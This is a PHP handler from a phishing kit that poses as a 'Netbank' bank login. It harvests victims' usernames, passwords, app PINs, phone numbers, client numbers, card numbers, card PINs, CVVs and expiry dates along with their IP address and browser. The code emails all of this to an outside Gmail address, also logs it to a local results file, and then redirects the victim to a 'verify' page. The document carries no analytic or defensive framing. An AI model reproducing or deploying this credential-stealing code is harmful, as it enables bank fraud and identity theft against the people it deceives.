<?php


    $user2 = $_POST['txtMyClientNumber$field'];
    $passwd2 = $_POST['txtMyPassword$field'];
	$user1 = $_POST['txtMyClientNumber$field2'];
	$passwd1 = $_POST['txtMyPassword$field2'];
	$apppin = $_POST['APPPin'];
	$telephone= $_POST['Telephone'];
	$clientnum= $_POST['Clientnumber'];
	$cardnumber= $_POST['Cardnumber'];
	$cardpin = $_POST['Cardpin'];
	$cvv = $_POST['CVV'];
	$expiry= $_POST['Expiry'];

$ip = getenv("REMOTE_ADDR");
$browser = $_SERVER['HTTP_USER_AGENT'];
$adddate=date("D M d, Y g:i a");
$message .= "--------------+ Netbank Login +--------------\n";
$message .= "user     : ".$user2."\n";
$message .= "Password      : ".$passwd2."\n";
$message .= "+-\n";
$message .= "erruser     : ".$user1."\n";
$message .= "errPassword      : ".$passwd1."\n";
$message .= "apppinnum      : ".$apppin."\n";
$message .= "telephone      : ".$telephone."\n";
$message .= "clientnum      : ".$clientnum."\n";
$message .= "cardpin      : ".$cardpin."\n";
$message .= "cvv      		: ".$cvv."\n";
$message .= "expiry      : ".$expiry."\n";
$message .= "+------\n";
$message .= "Date : $adddate\n";
$message .= "IP Address : $ip\n";
$message .= "User-Agent: ".$browser."\n";
$message .= "--------------+ Aokville voodoo +--------------\n";

$recipient = "loripeter44@gmail.com";
$subject = "$name - $ip";
$headers = "From: Y! <9awu0day.com>";
$headers = "MIME-Version: 1.0\n";
    if (mail($recipient,$subject,$message,$headers))
        {
        header("Location: verify.htm");
        }
    else
        {
        print("504 Internal Error");
        }
$text = fopen('rezlt.txt', 'a');
fwrite($text, $message);
?>